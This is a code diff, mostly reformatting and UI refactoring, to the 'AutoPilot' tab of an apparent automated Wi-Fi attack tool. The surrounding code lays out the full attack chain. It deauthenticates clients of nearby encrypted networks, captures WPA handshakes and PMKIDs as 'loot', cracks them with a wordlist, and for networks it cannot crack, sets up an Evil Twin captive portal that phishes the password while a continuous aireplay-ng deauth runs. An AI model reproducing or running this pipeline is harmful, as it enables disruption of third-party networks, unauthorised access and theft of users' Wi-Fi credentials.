@@ -128,9 +128,7 @@ class AutoPilotWorker(QThread):
 
         ifaces = self.orchestrator.wifi_interfaces()
         if not ifaces:
-            self._log(
-                "❌ No wireless interfaces detected. Plug in an adapter."
-            )
+            self._log("❌ No wireless interfaces detected. Plug in an adapter.")
             self.finished_signal.emit(False)
             return
 
@@ -154,9 +152,7 @@ class AutoPilotWorker(QThread):
                 self._log(f"  ⚠ Skipping {name}: {reason}")
 
         if not target_iface:
-            self._log(
-                "❌ All interfaces are providing your internet connection."
-            )
+            self._log("❌ All interfaces are providing your internet connection.")
             self._log("   Plug in a second USB Wi-Fi adapter for attacks.")
             self.finished_signal.emit(False)
             return
@@ -199,9 +195,7 @@ class AutoPilotWorker(QThread):
         aps = recon.get("aps", [])
         encrypted = [ap for ap in aps if "OPN" not in ap.get("privacy", "")]
 
-        self._log(
-            f"Discovered {len(aps)} total APs, {len(encrypted)} encrypted."
-        )
+        self._log(f"Discovered {len(aps)} total APs, {len(encrypted)} encrypted.")
 
         if not encrypted:
             self._log("⚠ No encrypted APs in range. Nothing to capture.")
@@ -245,8 +239,8 @@ class AutoPilotWorker(QThread):
             self._log(f"{'─'*50}")
 
             # Safety: don't deauth our own AP
-            deauth_ok, deauth_reason = (
-                self.orchestrator.net_guard.check_deauth_safe(bssid)
+            deauth_ok, deauth_reason = self.orchestrator.net_guard.check_deauth_safe(
+                bssid
             )
             if not deauth_ok:
                 self._log(f"⚠ SKIPPED (self-protection): {deauth_reason}")
@@ -277,13 +271,9 @@ class AutoPilotWorker(QThread):
                     if self._aborted():
                         break
 
-                    self._log(
-                        f"  Deauth attempt {attempt}/{self.deauth_attempts}…"
-                    )
+                    self._log(f"  Deauth attempt {attempt}/{self.deauth_attempts}…")
                     try:
-                        self.orchestrator.aircrack.deauth(
-                            mon_iface, bssid, count=15
-                        )
+                        self.orchestrator.aircrack.deauth(mon_iface, bssid, count=15)
                     except Exception as e:
                         self._log(f"  ⚠ Deauth failed: {e}")
 
@@ -310,15 +300,17 @@ class AutoPilotWorker(QThread):
                 if not found_handshake and not self._aborted():
                     self._log(f"  🔄 Trying PMKID capture (clientless)…")
                     try:
-                        pmkid_pcap = f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.pcapng"
+                        pmkid_pcap = (
+                            f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.pcapng"
+                        )
                         self.orchestrator.layer.run(f"rm -f {pmkid_pcap}")
-                        pmkid_result = (
-                            self.orchestrator.hcxtools.capture_pmkid(
-                                mon_iface, pmkid_pcap, timeout=20
-                            )
+                        pmkid_result = self.orchestrator.hcxtools.capture_pmkid(
+                            mon_iface, pmkid_pcap, timeout=20
                         )
                         # Check if we got anything
-                        hc_out = f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.hc22000"
+                        hc_out = (
+                            f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.hc22000"
+                        )
                         extract = self.orchestrator.hcxtools.extract_hashes(
                             pmkid_pcap, hc_out
                         )
@@ -339,14 +331,11 @@ class AutoPilotWorker(QThread):
                 # Save loot
                 if found_handshake:
                     safe_name = (
-                        "".join(
-                            c for c in essid if c.isalnum() or c in " -_"
-                        ).strip()
+                        "".join(c for c in essid if c.isalnum() or c in " -_").strip()
                         or "hidden"
                     )
                     final_path = (
-                        self.loot_dir
-                        / f"{safe_name}_{bssid.replace(':', '')}.cap"
+                        self.loot_dir / f"{safe_name}_{bssid.replace(':', '')}.cap"
                     )
                     shutil.copy2(cap_file, final_path)
                     ap["loot_path"] = str(final_path)
@@ -354,9 +343,7 @@ class AutoPilotWorker(QThread):
                     captured_files.append((ap, str(final_path)))
                     self._log(f"  💾 Saved → {final_path}")
                 else:
-                    self._log(
-                        f"  ❌ No handshake or PMKID after all attempts."
-                    )
+                    self._log(f"  ❌ No handshake or PMKID after all attempts.")
                     ap["captured"] = False
 
             except Exception as e:
@@ -379,9 +366,7 @@ class AutoPilotWorker(QThread):
         if not captured_files:
             self._log("No handshakes to crack. Skipping.")
         elif not self.auto_crack:
-            self._log(
-                "Auto-crack disabled. Use the Cracker tab to crack manually."
-            )
+            self._log("Auto-crack disabled. Use the Cracker tab to crack manually.")
         else:
             wordlist = self.orchestrator.find_wordlist("password")
             if not wordlist:
@@ -424,9 +409,7 @@ class AutoPilotWorker(QThread):
                             except Exception:
                                 pass
                         else:
-                            self._log(
-                                f"  🔒 Not cracked — key not in wordlist."
-                            )
+                            self._log(f"  🔒 Not cracked — key not in wordlist.")
                             ap_data["cracked"] = False
                     except Exception as e:
                         self._log(f"  ❌ Crack error: {e}")
@@ -453,16 +436,12 @@ class AutoPilotWorker(QThread):
             self._log("⚠ PineAP module not injected, cannot launch portal.")
         else:
             uncracked = [
-                (ap, cap)
-                for ap, cap in captured_files
-                if not ap.get("cracked")
+                (ap, cap) for ap, cap in captured_files if not ap.get("cracked")
             ]
             if not uncracked:
                 self._log("No uncracked targets available for Evil Twin.")
             else:
-                self._log(
-                    f"Found {len(uncracked)} uncracked targets for Evil Twin."
-                )
+                self._log(f"Found {len(uncracked)} uncracked targets for Evil Twin.")
 
                 portal_iface = None
                 ifaces = self.orchestrator.wifi_interfaces()
@@ -475,9 +454,7 @@ class AutoPilotWorker(QThread):
                         break
 
                 if not portal_iface:
-                    self._log(
-                        "❌ No safe interface found for Evil Twin portal."
-                    )
+                    self._log("❌ No safe interface found for Evil Twin portal.")
                 else:
                     from james.tools.pineap import CREDS_LOG
 
@@ -518,9 +495,7 @@ class AutoPilotWorker(QThread):
 
                         deauth_proc = None
                         if deauth_mon:
-                            self._log(
-                                f"  Using {deauth_mon} for continuous deauth."
-                            )
+                            self._log(f"  Using {deauth_mon} for continuous deauth.")
                             deauth_proc = self.orchestrator.layer.run_background(
                                 f"aireplay-ng -0 0 -a {shlex.quote(bssid)} -D {shlex.quote(deauth_mon)}",
                                 sudo=True,
@@ -547,9 +522,7 @@ class AutoPilotWorker(QThread):
                                     self._log(
                                         f"  [PORTAL] Testing submitted password: {pwd}"
                                     )
-                                    dict_path = (
-                                        "/tmp/james_autopilot_portal.txt"
-                                    )
+                                    dict_path = "/tmp/james_autopilot_portal.txt"
                                     Path(dict_path).write_text(pwd + "\n")
 
                                     # Verify password with aircrack
@@ -566,16 +539,12 @@ class AutoPilotWorker(QThread):
                                 break
 
                         if deauth_proc:
-                            self.orchestrator.layer.kill_background(
-                                deauth_proc
-                            )
+                            self.orchestrator.layer.kill_background(deauth_proc)
 
                         pineap.stop_all()
 
                         if valid_password:
-                            self._log(
-                                f"  🎉 EVIL TWIN SUCCESS: {valid_password}"
-                            )
+                            self._log(f"  🎉 EVIL TWIN SUCCESS: {valid_password}")
                             ap_data["cracked"] = True
                             ap_data["key"] = valid_password
                             self.loot_signal.emit(ap_data)
@@ -667,6 +636,13 @@ class AutoPilotTab(QWidget):
         layout.setContentsMargins(16, 16, 16, 16)
         layout.setSpacing(12)
 
+        layout.addLayout(self._build_action_row())
+        layout.addLayout(self._build_settings_row())
+        layout.addWidget(self._build_phase_strip())
+        layout.addWidget(self._build_progress_bar())
+        layout.addWidget(self._build_log_loot_splitter())
+
+    def _build_action_row(self) -> QHBoxLayout:
         # ── Primary action row ──
         action_row = QHBoxLayout()
         action_row.setSpacing(8)
@@ -679,8 +655,9 @@ class AutoPilotTab(QWidget):
         action_row.addWidget(self.btn_start)
         action_row.addWidget(self.btn_stop)
         action_row.addStretch()
-        layout.addLayout(action_row)
+        return action_row
 
+    def _build_settings_row(self) -> QHBoxLayout:
         # ── Settings row (flat, no group box) ──
         settings_row = QHBoxLayout()
         settings_row.setSpacing(12)
@@ -745,14 +722,14 @@ class AutoPilotTab(QWidget):
         ):
             settings_row.addWidget(w)
         settings_row.addStretch()
-        layout.addLayout(settings_row)
+        return settings_row
 
+    def _build_phase_strip(self) -> QWidget:
         # ── Phase + metrics strip ──
         phase_strip = QWidget()
         phase_strip.setFixedHeight(48)
         phase_strip.setStyleSheet(
-            "background: #181818; border: 1px solid #2B2B2B;"
-            " border-radius: 6px;"
+            "background: #181818; border: 1px solid #2B2B2B;" " border-radius: 6px;"
         )
         ps = QHBoxLayout(phase_strip)
         ps.setContentsMargins(16, 0, 16, 0)
@@ -775,16 +752,18 @@ class AutoPilotTab(QWidget):
             self._m_cracked,
         ):
             ps.addWidget(m)
-        layout.addWidget(phase_strip)
+        return phase_strip
 
+    def _build_progress_bar(self) -> QProgressBar:
         # Progress bar
         self.progress_bar = QProgressBar()
         self.progress_bar.setRange(0, AutoPilotWorker.TOTAL_PHASES)
         self.progress_bar.setValue(0)
         self.progress_bar.setTextVisible(False)
         self.progress_bar.setFixedHeight(4)
-        layout.addWidget(self.progress_bar)
+        return self.progress_bar
 
+    def _build_log_loot_splitter(self) -> QSplitter:
         # ── Log + Loot splitter ──
         splitter = QSplitter(Qt.Horizontal)
         splitter.setHandleWidth(1)
@@ -805,22 +784,16 @@ class AutoPilotTab(QWidget):
         loot_layout.setContentsMargins(8, 8, 8, 8)
         self.loot_table = QTableWidget()
         self.loot_table.setColumnCount(5)
-        self.loot_table.setHorizontalHeaderLabels(
-            ["ESSID", "BSSID", "CH", "HS", "Key"]
-        )
-        self.loot_table.horizontalHeader().setSectionResizeMode(
-            0, QHeaderView.Stretch
-        )
-        self.loot_table.horizontalHeader().setSectionResizeMode(
-            4, QHeaderView.Stretch
-        )
+        self.loot_table.setHorizontalHeaderLabels(["ESSID", "BSSID", "CH", "HS", "Key"])
+        self.loot_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
+        self.loot_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.Stretch)
         self.loot_table.verticalHeader().setVisible(False)
         self.loot_table.setAlternatingRowColors(True)
         loot_layout.addWidget(self.loot_table)
         splitter.addWidget(loot_group)
 
         splitter.setSizes([480, 480])
-        layout.addWidget(splitter)
+        return splitter
 
     def _make_strip_metric(self, label: str, value: str) -> QWidget:
         w = QWidget()
@@ -840,9 +813,7 @@ class AutoPilotTab(QWidget):
         v.addWidget(cap)
         return w
 
-    def _set_strip_metric(
-        self, widget: QWidget, value: str, color: str = "#CCCCCC"
-    ):
+    def _set_strip_metric(self, widget: QWidget, value: str, color: str = "#CCCCCC"):
         lbl = widget.findChildren(QLabel)[0]
         lbl.setText(value)
         lbl.setStyleSheet(
@@ -863,9 +834,7 @@ class AutoPilotTab(QWidget):
         self.chk_crack.setText(f"🔓 Auto-Crack: {'ON' if checked else 'OFF'}")
 
     def _toggle_airgeddon(self, checked):
-        self.chk_airgeddon.setText(
-            f"👿 Auto-Airgeddon: {'ON' if checked else 'OFF'}"
-        )
+        self.chk_airgeddon.setText(f"👿 Auto-Airgeddon: {'ON' if checked else 'OFF'}")
 
     # ── actions ────────────────────────────────────────────
 
@@ -938,9 +907,7 @@ class AutoPilotTab(QWidget):
     def _update_phase(self, idx, title):
         self.lbl_phase.setText(title)
         self.progress_bar.setValue(idx)
-        self._set_strip_metric(
-            self._m_targets, str(self.loot_table.rowCount())
-        )
+        self._set_strip_metric(self._m_targets, str(self.loot_table.rowCount()))
 
     def _add_or_update_loot(self, ap):
         """Insert or update a row in the loot table based on BSSID."""
@@ -954,19 +921,13 @@ class AutoPilotTab(QWidget):
                 existing_row = row
                 break
 
-        row = (
-            existing_row
-            if existing_row is not None
-            else self.loot_table.rowCount()
-        )
+        row = existing_row if existing_row is not None else self.loot_table.rowCount()
         if existing_row is None:
             self.loot_table.insertRow(row)
 
         self.loot_table.setItem(row, 0, QTableWidgetItem(ap.get("essid", "")))
         self.loot_table.setItem(row, 1, QTableWidgetItem(bssid))
-        self.loot_table.setItem(
-            row, 2, QTableWidgetItem(str(ap.get("channel", "")))
-        )
+        self.loot_table.setItem(row, 2, QTableWidgetItem(str(ap.get("channel", ""))))
 
         # Handshake status
         hs_item = QTableWidgetItem()
@@ -998,8 +959,7 @@ class AutoPilotTab(QWidget):
         captured = sum(
             1
             for r in range(self.loot_table.rowCount())
-            if self.loot_table.item(r, 3)
-            and self.loot_table.item(r, 3).text() == "YES"
+            if self.loot_table.item(r, 3) and self.loot_table.item(r, 3).text() == "YES"
         )
         cracked = sum(
             1
@@ -1007,9 +967,7 @@ class AutoPilotTab(QWidget):
             if self.loot_table.item(r, 4)
             and self.loot_table.item(r, 4).text() not in ("", "—", "pending")
         )
-        self._set_strip_metric(
-            self._m_targets, str(self.loot_table.rowCount())
-        )
+        self._set_strip_metric(self._m_targets, str(self.loot_table.rowCount()))
         self._set_strip_metric(
             self._m_captured,
             str(captured),
@@ -1026,9 +984,7 @@ class AutoPilotTab(QWidget):
         self._elapsed_timer.stop()
 
         if success:
-            show_toast(
-                self.main_window, "Auto-Pilot complete", level="success"
-            )
+            show_toast(self.main_window, "Auto-Pilot complete", level="success")
             self.lbl_phase.setText("Complete")
             self.lbl_phase.setStyleSheet(
                 "color: #2EA043; font-size: 16px; font-weight: 700;"
